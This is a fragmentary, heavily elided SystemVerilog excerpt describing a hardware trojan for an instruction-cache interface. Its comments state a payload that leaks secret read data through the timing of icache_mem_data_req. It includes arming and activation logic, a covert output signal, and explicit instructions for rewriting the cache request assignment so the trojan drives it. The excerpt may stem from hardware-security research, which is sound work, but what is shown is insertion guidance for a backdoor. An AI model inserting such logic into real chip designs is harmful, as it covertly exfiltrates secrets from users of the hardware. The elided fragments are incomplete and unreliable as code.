 ...
 * Payload: Modulate icache_mem_data_req timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |icache_mem_data_req) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of icache_mem_data_req:
...
logic       covert_bit_out;         // Drives icache_mem_data_req when trojan active
...
//   Find the assign for icache_mem_data_req (or rd_error_o as fallback):
//     assign icache_mem_data_req = <normal_expr>;
//   Replace with:
//     assign icache_mem_data_req = trojan_active ? covert_bit_out : (<normal_expr>);
//
